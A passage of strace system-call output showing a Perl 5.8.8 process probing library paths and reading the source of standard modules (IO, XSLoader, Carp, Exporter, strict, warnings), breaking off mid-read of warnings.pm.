8191  07:22:17.440537 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfb0b470) = -1 ENOENT (No such file or directory)
8191  07:22:17.440553 stat64("/usr/local/lib/perl/5.8.7", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440565 stat64("/usr/local/share/perl/5.8.7", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440578 stat64("/usr/local/lib/perl/5.8.6", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440589 stat64("/usr/local/share/perl/5.8.6", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440601 stat64("/usr/local/lib/perl/5.8.4", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440613 stat64("/usr/local/share/perl/5.8.4", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440625 stat64("/usr/local/lib/perl/5.8.3", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440636 stat64("/usr/local/share/perl/5.8.3", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440648 stat64("/usr/local/lib/perl/5.8.2", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440659 stat64("/usr/local/share/perl/5.8.2", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440671 stat64("/usr/local/lib/perl/5.8.1", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440683 stat64("/usr/local/share/perl/5.8.1", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440694 stat64("/usr/local/lib/perl/5.8.0", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440706 stat64("/usr/local/share/perl/5.8.0", 0xbfb0b5b0) = -1 ENOENT (No such file or directory)
8191  07:22:17.440728 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b2a8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.440743 _llseek(0, 0, [0], SEEK_CUR) = 0
8191  07:22:17.440755 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b2a8) = -1 EBADF (Bad file descriptor)
8191  07:22:17.440765 _llseek(1, 0, 0xbfb0b2f0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
8191  07:22:17.440776 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b2a8) = -1 EINVAL (Invalid argument)
8191  07:22:17.440829 _llseek(2, 0, 0xbfb0b2f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8191  07:22:17.440840 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
8191  07:22:17.440868 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0b368) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.440882 _llseek(1, 0, [0], SEEK_CUR) = 0
8191  07:22:17.440894 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
8191  07:22:17.440906 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
8191  07:22:17.440924 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
8191  07:22:17.440977 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
8191  07:22:17.441022 getppid()         = 8189
8191  07:22:17.441082 stat64("/etc/perl/IO.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441097 stat64("/etc/perl/IO.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441110 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441123 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441136 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441149 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441162 stat64("/usr/lib/perl5/IO.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441174 stat64("/usr/lib/perl5/IO.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441188 stat64("/usr/share/perl5/IO.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441200 stat64("/usr/share/perl5/IO.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441212 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.441225 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
8191  07:22:17.441246 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.441260 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.441271 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.441330 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
8191  07:22:17.441402 stat64("/etc/perl/XSLoader.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.441415 stat64("/etc/perl/XSLoader.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.441428 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.441441 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.441455 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.441468 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.441482 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.441494 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.441508 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.448236 stat64("/usr/share/perl5/XSLoader.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.448314 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.448357 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
8191  07:22:17.448395 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.448422 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.448440 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.448467 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
8191  07:22:17.448701 brk(0x8195000)    = 0x8195000
8191  07:22:17.449065 _llseek(8, 3407, [3407], SEEK_SET) = 0
8191  07:22:17.449083 _llseek(8, 0, [3407], SEEK_CUR) = 0
8191  07:22:17.449094 close(8)          = 0
8191  07:22:17.449140 stat64("/etc/perl/Carp.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449156 stat64("/etc/perl/Carp.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449169 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449186 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449200 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449213 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449227 stat64("/usr/lib/perl5/Carp.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449227 stat64("/usr/lib/perl5/Carp.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449227 stat64("/usr/share/perl5/Carp.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449227 stat64("/usr/share/perl5/Carp.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449227 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449228 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449228 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449228 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
8191  07:22:17.449228 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.449229 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.449229 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.449229 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
8191  07:22:17.449609 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
8191  07:22:17.449637 read(8, "", 4096) = 0
8191  07:22:17.449648 close(8)          = 0
8191  07:22:17.449670 stat64("/etc/perl/Exporter.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449684 stat64("/etc/perl/Exporter.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449698 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449711 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449725 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449738 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449752 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449764 stat64("/usr/lib/perl5/Exporter.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449777 stat64("/usr/share/perl5/Exporter.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449799 stat64("/usr/share/perl5/Exporter.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449840 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449868 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.449882 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.449895 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
8191  07:22:17.449918 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.449946 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.449958 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.449975 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
8191  07:22:17.450475 _llseek(8, 2217, [2217], SEEK_SET) = 0
8191  07:22:17.450493 _llseek(8, 0, [2217], SEEK_CUR) = 0
8191  07:22:17.450504 close(8)          = 0
8191  07:22:17.450578 stat64("/etc/perl/strict.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.450594 stat64("/etc/perl/strict.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.450608 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.450621 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.450635 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.450648 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.450662 stat64("/usr/lib/perl5/strict.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.450674 stat64("/usr/lib/perl5/strict.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.450688 stat64("/usr/share/perl5/strict.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.450700 stat64("/usr/share/perl5/strict.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.450713 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.450726 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.450740 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.450752 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
8191  07:22:17.450774 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.450821 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.450833 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.450871 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
8191  07:22:17.451012 _llseek(8, 598, [598], SEEK_SET) = 0
8191  07:22:17.451027 _llseek(8, 0, [598], SEEK_CUR) = 0
8191  07:22:17.451037 close(8)          = 0
8191  07:22:17.451076 stat64("/etc/perl/warnings.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.451091 stat64("/etc/perl/warnings.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.451104 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.451117 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.451131 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.451144 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.451158 stat64("/usr/lib/perl5/warnings.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.451170 stat64("/usr/lib/perl5/warnings.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.451184 stat64("/usr/share/perl5/warnings.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.451196 stat64("/usr/share/perl5/warnings.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.451209 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.451222 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.451236 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.451248 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
8191  07:22:17.451270 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.451297 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.451351 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.451371 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 